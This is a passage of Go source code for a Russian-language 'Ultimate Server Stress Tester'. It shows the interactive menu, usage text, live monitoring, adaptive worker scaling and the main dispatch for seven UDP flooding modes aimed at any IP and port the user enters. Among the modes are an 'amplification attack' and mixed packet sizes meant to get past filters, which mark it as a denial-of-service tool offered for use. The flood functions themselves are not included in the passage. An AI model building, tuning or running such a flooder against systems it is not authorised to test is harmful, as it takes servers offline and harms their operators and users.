						ColorGreen, ColorReset, newWorkers, goroutines+int32(newWorkers))

					for i := 0; i < newWorkers; i++ {
						wg.Add(1)
						go worker()
					}
				} else if errorRate > 5.0 && goroutines > 100 {
					// Много ошибок - снижаем нагрузку
					fmt.Printf("\n%s[ADAPTIVE]%s Высокий уровень ошибок (%.1f%%), снижаем нагрузку\n",
						ColorRed, ColorReset, errorRate)
					// Просто сообщаем, воркеры сами завершатся
				}

				lastRate = currentRate
				lastSent = sent
			}
		}
	}()

	// Мониторинг
	go func() {
		ticker := time.NewTicker(500 * time.Millisecond)
		defer ticker.Stop()
		lastSent := uint64(0)

		for {
			select {
			case <-stopChan:
				return
			case <-ticker.C:
				elapsed := time.Since(startTime).Seconds()
				sent := atomic.LoadUint64(&totalSent.value)
				errors := atomic.LoadUint64(&totalErrors.value)
				goroutines := atomic.LoadInt32(&currentGoroutines)

				instantRate := uint64(float64(sent-lastSent) * 2)
				lastSent = sent

				currentPeak := atomic.LoadUint64(&peakRate.value)
				if instantRate > currentPeak {
					atomic.StoreUint64(&peakRate.value, instantRate)
				}

				avgRate := float64(sent) / elapsed

				fmt.Printf("\r%s[%.1fs]%s Workers: %s%d%s | Sent: %s%s%s | Avg: %s%s/s%s | Now: %s%s/s%s | Err: %s%s%s     ",
					ColorYellow, elapsed, ColorReset,
					ColorCyan, goroutines, ColorReset,
					ColorGreen, formatNumber(sent), ColorReset,
					ColorWhite, formatNumber(uint64(avgRate)), ColorReset,
					ColorPurple, formatNumber(instantRate), ColorReset,
					ColorRed, formatNumber(errors), ColorReset)
			}
		}
	}()

	time.Sleep(time.Duration(duration) * time.Second)
	close(stopChan)
	wg.Wait()

	fmt.Println()
	printDetailedStats(time.Since(startTime).Seconds())
}

// Функция для чтения ввода пользователя
func readInput(prompt string) string {
	reader := bufio.NewReader(os.Stdin)
	fmt.Print(prompt)
	input, _ := reader.ReadString('\n')
	return strings.TrimSpace(input)
}

// Функция для чтения числа с проверкой
func readInt(prompt string, defaultValue int, min int, max int) int {
	input := readInput(fmt.Sprintf("%s (по умолчанию: %d): ", prompt, defaultValue))
	if input == "" {
		return defaultValue
	}

	value, err := strconv.Atoi(input)
	if err != nil || value < min || value > max {
		fmt.Printf("%sНеверное значение! Используется значение по умолчанию: %d%s\n", ColorRed, defaultValue, ColorReset)
		return defaultValue
	}
	return value
}

// Показать режимы тестирования
func showModes() {
	fmt.Printf("\n%s╔══════════════════════════════════════════════════════════════════════════════╗%s\n", ColorCyan, ColorReset)
	fmt.Printf("%s║                        РЕЖИМЫ ТЕСТИРОВАНИЯ                                   ║%s\n", ColorCyan, ColorReset)
	fmt.Printf("%s╚══════════════════════════════════════════════════════════════════════════════╝%s\n", ColorCyan, ColorReset)
	fmt.Println()
	fmt.Printf("%s[1]%s %sEXTREME UDP FLOOD%s\n", ColorGreen, ColorReset, ColorBold, ColorReset)
	fmt.Printf("    └─ Непрерывная отправка пакетов с батчингом и пулом соединений\n")
	fmt.Printf("    └─ Рекомендовано: Горутин = CPU * 50-100\n")
	fmt.Println()

	fmt.Printf("%s[2]%s %sRAW SPEED FLOOD%s\n", ColorRed, ColorReset, ColorBold, ColorReset)
	fmt.Printf("    └─ Zero-copy syscalls для максимальной скорости (ТОЛЬКО отправка)\n")
	fmt.Printf("    └─ Рекомендовано: Горутин = CPU * 200-500\n")
	fmt.Println()

	fmt.Printf("%s[3]%s %sAMPLIFICATION ATTACK%s\n", ColorYellow, ColorReset, ColorBold, ColorReset)
	fmt.Printf("    └─ Запросы с получением больших ответов (усиление трафика)\n")
	fmt.Printf("    └─ Рекомендовано: Горутин = CPU * 20-50\n")
	fmt.Println()

	fmt.Printf("%s[4]%s %sMIXED SIZE ATTACK%s\n", ColorCyan, ColorReset, ColorBold, ColorReset)
	fmt.Printf("    └─ Пакеты разных размеров (100-1400 байт) для обхода фильтров\n")
	fmt.Printf("    └─ Рекомендовано: Горутин = CPU * 50-100\n")
	fmt.Println()

	fmt.Printf("%s[5]%s %sCOORDINATED STRIKE%s\n", ColorPurple, ColorReset, ColorBold, ColorReset)
	fmt.Printf("    └─ Использование ВСЕХ ядер CPU с координацией потоков\n")
	fmt.Printf("    └─ Рекомендовано: Горутин на ядро = 100-200\n")
	fmt.Println()

	fmt.Printf("%s[6]%s %sBURST ATTACK%s\n", ColorBlue, ColorReset, ColorBold, ColorReset)
	fmt.Printf("    └─ Отправка N запросов максимально быстро\n")
	fmt.Printf("    └─ Рекомендовано: Горутин = CPU * 100\n")
	fmt.Println()

	fmt.Printf("%s[7]%s %sADAPTIVE LOAD%s\n", ColorGreen, ColorReset, ColorBold, ColorReset)
	fmt.Printf("    └─ Автоматическая подстройка нагрузки под производительность\n")
	fmt.Printf("    └─ Рекомендовано: Начальных горутин = CPU * 50\n")
	fmt.Println()

	fmt.Printf("%s[0]%s %sВЫХОД%s\n\n", ColorRed, ColorReset, ColorBold, ColorReset)
}

// Интерактивное меню конфигурации
func interactiveMenu() (int, int, int, int, int, int, int) {
	cpuCount := runtime.NumCPU()

	fmt.Printf("\n%s%s%s%s\n", ColorBold, ColorCyan, repeat('═', 80), ColorReset)
	fmt.Printf("%s%s         ULTIMATE SERVER STRESS TESTER - GO EDITION (OPTIMIZED)%s\n", ColorBold, ColorYellow, ColorReset)
	fmt.Printf("%s%s                      ИНТЕРАКТИВНЫЙ РЕЖИМ%s\n", ColorBold, ColorGreen, ColorReset)
	fmt.Printf("%s%s%s%s\n", ColorBold, ColorCyan, repeat('═', 80), ColorReset)

	fmt.Printf("\n%s► Системная информация:%s\n", ColorCyan, ColorReset)
	fmt.Printf("  ├─ Обнаружено CPU ядер: %s%d%s\n", ColorYellow, cpuCount, ColorReset)
	fmt.Printf("  └─ GOMAXPROCS: %s%d%s\n", ColorYellow, runtime.GOMAXPROCS(0), ColorReset)

	// Конфигурация CPU
	fmt.Printf("\n%s► Настройка CPU:%s\n", ColorCyan, ColorReset)
	fmt.Printf("  Всего доступно ядер: %s%d%s\n", ColorGreen, cpuCount, ColorReset)
	useCPU := readInt("  Сколько ядер использовать", cpuCount, 1, cpuCount)
	runtime.GOMAXPROCS(useCPU)
	fmt.Printf("  %s✓ Будет использовано ядер: %d%s\n", ColorGreen, useCPU, ColorReset)

	// Конфигурация сервера
	fmt.Printf("\n%s► Настройка цели:%s\n", ColorCyan, ColorReset)
	serverIP := readInput(fmt.Sprintf("  IP адрес сервера (по умолчанию: %s): ", *ServerIP))
	if serverIP == "" {
		serverIP = *ServerIP
	}
	serverPort := readInt("  Порт сервера", *ServerPort, 1, 65535)

	fmt.Printf("  %s✓ Цель: %s:%d%s\n", ColorGreen, serverIP, serverPort, ColorReset)
	*ServerIP = serverIP
	*ServerPort = serverPort

	// Выбор режима
	showModes()
	mode := readInt("Выберите режим", 1, 0, 7)

	if mode == 0 {
		fmt.Printf("\n%s✓ Выход из программы%s\n\n", ColorYellow, ColorReset)
		os.Exit(0)
	}

	// Параметры в зависимости от режима
	var duration, goroutines, threadsPerCore, totalRequests, batchSize, poolSize int

	fmt.Printf("\n%s► Настройка параметров для режима %d:%s\n", ColorCyan, mode, ColorReset)

	switch mode {
	case 1: // Extreme UDP Flood
		duration = readInt("  Длительность (секунды)", 60, 1, 3600)
		recommendedGoroutines := useCPU * 75
		fmt.Printf("  %sРекомендуется горутин: %d (CPU * 75)%s\n", ColorYellow, recommendedGoroutines, ColorReset)
		goroutines = readInt("  Количество горутин", recommendedGoroutines, 1, 100000)
		batchSize = readInt("  Размер батча (пакетов)", 100, 1, 10000)
		poolSize = readInt("  Размер пула соединений", 100, 1, 10000)

	case 2: // Raw Speed
		duration = readInt("  Длительность (секунды)", 30, 1, 3600)
		recommendedGoroutines := useCPU * 300
		fmt.Printf("  %sРекомендуется горутин: %d (CPU * 300)%s\n", ColorYellow, recommendedGoroutines, ColorReset)
		goroutines = readInt("  Количество горутин", recommendedGoroutines, 1, 100000)
		batchSize = readInt("  Размер батча (пакетов)", 200, 1, 10000)

	case 3: // Amplification
		duration = readInt("  Длительность (секунды)", 60, 1, 3600)
		recommendedGoroutines := useCPU * 30
		fmt.Printf("  %sРекомендуется горутин: %d (CPU * 30)%s\n", ColorYellow, recommendedGoroutines, ColorReset)
		goroutines = readInt("  Количество горутин", recommendedGoroutines, 1, 100000)
		poolSize = readInt("  Размер пула соединений", 100, 1, 10000)

	case 4: // Mixed Size
		duration = readInt("  Длительность (секунды)", 60, 1, 3600)
		recommendedGoroutines := useCPU * 75
		fmt.Printf("  %sРекомендуется горутин: %d (CPU * 75)%s\n", ColorYellow, recommendedGoroutines, ColorReset)
		goroutines = readInt("  Количество горутин", recommendedGoroutines, 1, 100000)
		poolSize = readInt("  Размер пула соединений", 100, 1, 10000)

	case 5: // Coordinated Strike
		duration = readInt("  Длительность (секунды)", 120, 1, 3600)
		threadsPerCore = readInt("  Горутин на одно CPU ядро", 100, 1, 10000)
		batchSize = readInt("  Размер батча (пакетов)", 100, 1, 10000)
		poolSize = readInt("  Размер пула соединений", 100, 1, 10000)

	case 6: // Burst Attack
		totalRequests = readInt("  Всего запросов", 1000000, 1, 1000000000)
		recommendedGoroutines := useCPU * 100
		fmt.Printf("  %sРекомендуется горутин: %d (CPU * 100)%s\n", ColorYellow, recommendedGoroutines, ColorReset)
		goroutines = readInt("  Количество горутин", recommendedGoroutines, 1, 100000)
		batchSize = readInt("  Размер батча (пакетов)", 100, 1, 10000)
		poolSize = readInt("  Размер пула соединений", 100, 1, 10000)
		duration = 0 // не используется в этом режиме

	case 7: // Adaptive Load
		duration = readInt("  Длительность (секунды)", 300, 1, 3600)
		recommendedGoroutines := useCPU * 50
		fmt.Printf("  %sРекомендуется начальных горутин: %d (CPU * 50)%s\n", ColorYellow, recommendedGoroutines, ColorReset)
		goroutines = readInt("  Начальное количество горутин", recommendedGoroutines, 1, 100000)
		poolSize = readInt("  Размер пула соединений", 100, 1, 10000)
	}

	// Подтверждение запуска
	fmt.Printf("\n%s%s%s%s\n", ColorBold, ColorYellow, repeat('─', 80), ColorReset)
	fmt.Printf("%s► КОНФИГУРАЦИЯ ТЕСТА:%s\n", ColorYellow, ColorReset)
	fmt.Printf("  ├─ Режим: %s%d%s\n", ColorGreen, mode, ColorReset)
	fmt.Printf("  ├─ Цель: %s%s:%d%s\n", ColorGreen, serverIP, serverPort, ColorReset)
	fmt.Printf("  ├─ CPU ядер: %s%d%s\n", ColorGreen, useCPU, ColorReset)
	if duration > 0 {
		fmt.Printf("  ├─ Длительность: %s%d сек%s\n", ColorGreen, duration, ColorReset)
	}
	if goroutines > 0 {
		fmt.Printf("  ├─ Горутин: %s%d%s\n", ColorGreen, goroutines, ColorReset)
	}
	if threadsPerCore > 0 {
		fmt.Printf("  ├─ Горутин на ядро: %s%d%s\n", ColorGreen, threadsPerCore, ColorReset)
	}
	if totalRequests > 0 {
		fmt.Printf("  ├─ Всего запросов: %s%s%s\n", ColorGreen, formatNumber(uint64(totalRequests)), ColorReset)
	}
	if batchSize > 0 {
		fmt.Printf("  ├─ Размер батча: %s%d%s\n", ColorGreen, batchSize, ColorReset)
	}
	if poolSize > 0 {
		fmt.Printf("  └─ Размер пула: %s%d%s\n", ColorGreen, poolSize, ColorReset)
	}
	fmt.Printf("%s%s%s%s\n", ColorBold, ColorYellow, repeat('─', 80), ColorReset)

	confirm := readInput(fmt.Sprintf("\n%s⚠ НАЧАТЬ ТЕСТ? (yes/no):%s ", ColorRed, ColorReset))
	if strings.ToLower(confirm) != "yes" && strings.ToLower(confirm) != "y" && strings.ToLower(confirm) != "да" {
		fmt.Printf("\n%s✗ Тест отменён%s\n\n", ColorRed, ColorReset)
		os.Exit(0)
	}

	// Обновляем глобальные переменные
	if batchSize > 0 {
		*BatchSize = batchSize
	}
	if poolSize > 0 {
		*ConnectionPool = poolSize
	}
	if threadsPerCore > 0 {
		*ThreadsPerCore = threadsPerCore
	}
	if totalRequests > 0 {
		*TotalRequests = totalRequests
	}

	return mode, duration, goroutines, threadsPerCore, totalRequests, batchSize, poolSize
}

func printUsage() {
	fmt.Printf("%s%s%s%s\n", ColorBold, ColorCyan, repeat('=', 80), ColorReset)
	fmt.Printf("%s%s  ULTIMATE SERVER STRESS TESTER - GO EDITION (OPTIMIZED)%s\n", ColorBold, ColorYellow, ColorReset)
	fmt.Printf("%s%s            МАКСИМАЛЬНАЯ ПРОИЗВОДИТЕЛЬНОСТЬ%s\n", ColorBold, ColorGreen, ColorReset)
	fmt.Printf("%s%s%s%s\n", ColorBold, ColorCyan, repeat('=', 80), ColorReset)
	fmt.Println()
	fmt.Println("ИСПОЛЬЗОВАНИЕ:")
	fmt.Printf("  %s1. Интерактивный режим (рекомендуется):%s\n", ColorGreen, ColorReset)
	fmt.Println("     ./server_stresser.exe")
	fmt.Println()
	fmt.Printf("  %s2. С параметрами командной строки:%s\n", ColorYellow, ColorReset)
	fmt.Println("     ./server_stresser.exe -mode 1 -duration 60 -goroutines 2000")
	fmt.Println()
	fmt.Println("ФЛАГИ:")
	flag.PrintDefaults()
	fmt.Println()
	fmt.Println("РЕЖИМЫ ТЕСТИРОВАНИЯ:")
	fmt.Printf("%s1.%s EXTREME UDP FLOOD         - Непрерывная отправка с батчингом\n", ColorGreen, ColorReset)
	fmt.Printf("%s2.%s RAW SPEED FLOOD          - Zero-copy syscalls (максимальная скорость)\n", ColorRed, ColorReset)
	fmt.Printf("%s3.%s AMPLIFICATION ATTACK     - Запросы с большими ответами\n", ColorYellow, ColorReset)
	fmt.Printf("%s4.%s MIXED SIZE ATTACK        - Пакеты разных размеров (100-1400 байт)\n", ColorCyan, ColorReset)
	fmt.Printf("%s5.%s COORDINATED STRIKE       - Использование ВСЕХ ядер CPU\n", ColorPurple, ColorReset)
	fmt.Printf("%s6.%s BURST ATTACK             - N запросов максимально быстро\n", ColorBlue, ColorReset)
	fmt.Printf("%s7.%s ADAPTIVE LOAD            - Самоподстройка под производительность\n", ColorGreen, ColorReset)
	fmt.Println()

	fmt.Printf("%sПРИМЕРЫ:%s\n", ColorYellow, ColorReset)
	fmt.Println("  # Интерактивный режим")
	fmt.Println("  ./server_stresser.exe")
	fmt.Println()
	fmt.Println("  # Режим 1: 60 сек, 2000 горутин, батч 200, пул 200")
	fmt.Println("  ./server_stresser.exe -mode 1 -duration 60 -goroutines 2000 -batch 200 -pool-size 200")
	fmt.Println()
	fmt.Println("  # Режим 2: максимальная скорость с zero-copy")
	fmt.Println("  ./server_stresser.exe -mode 2 -duration 30 -goroutines 5000 -batch 500")
	fmt.Println()
	fmt.Println("  # Режим 5: использовать все ядра CPU, 150 горутин на ядро")
	fmt.Println("  ./server_stresser.exe -mode 5 -duration 120 -threads-per-core 150")
	fmt.Println()
	fmt.Printf("%s%s%s%s\n", ColorBold, ColorCyan, repeat('=', 80), ColorReset)
}

func main() {
	// Инициализация
	runtime.GOMAXPROCS(runtime.NumCPU())
	initPackets()

	// Проверяем, были ли переданы параметры командной строки
	flag.Parse()

	var mode, duration, goroutines, threadsPerCore, totalRequests int

	// Если режим не указан (значение по умолчанию = 1, но можем проверить другие флаги)
	// Определяем, были ли переданы какие-либо флаги
	if len(os.Args) == 1 {
		// Интерактивный режим - нет аргументов командной строки
		mode, duration, goroutines, threadsPerCore, totalRequests, _, _ = interactiveMenu()
	} else if *Mode < 1 || *Mode > 7 {
		// Неверный режим - показываем помощь
		printUsage()
		return
	} else {
		// Используем параметры из командной строки
		mode = *Mode
		duration = *Duration
		goroutines = *Goroutines
		threadsPerCore = *ThreadsPerCore
		totalRequests = *TotalRequests

		fmt.Printf("%s%s%s%s\n", ColorBold, ColorCyan, repeat('=', 80), ColorReset)
		fmt.Printf("%s%s  ULTIMATE SERVER STRESS TESTER - GO EDITION (OPTIMIZED)%s\n", ColorBold, ColorYellow, ColorReset)
		fmt.Printf("%s%s%s%s\n", ColorBold, ColorCyan, repeat('=', 80), ColorReset)
		fmt.Printf("Целевой сервер:       %s%s:%d%s\n", ColorGreen, *ServerIP, *ServerPort, ColorReset)
		fmt.Printf("CPU ядер:             %s%d%s\n", ColorYellow, runtime.NumCPU(), ColorReset)
		fmt.Printf("GOMAXPROCS:           %s%d%s\n", ColorYellow, runtime.GOMAXPROCS(0), ColorReset)
		fmt.Printf("%s%s%s%s\n", ColorBold, ColorCyan, repeat('=', 80), ColorReset)
	}

	// Запуск выбранного режима
	switch mode {
	case 1:
		extremeUDPFloodOptimized(duration, goroutines)
	case 2:
		rawSpeedFloodZeroCopy(duration, goroutines)
	case 3:
		amplificationAttackOptimized(duration, goroutines)
	case 4:
		mixedSizeAttackOptimized(duration, goroutines)
	case 5:
		coordinatedStrikeOptimized(duration, threadsPerCore)
	case 6:
		burstAttackOptimized(totalRequests, goroutines)
	case 7:
		adaptiveLoadAttack(duration, goroutines)
	default:
		printUsage()
		return
	}

	fmt.Printf("\n%s✓ Тестирование завершено!%s\n\n", ColorGreen, ColorReset)
}
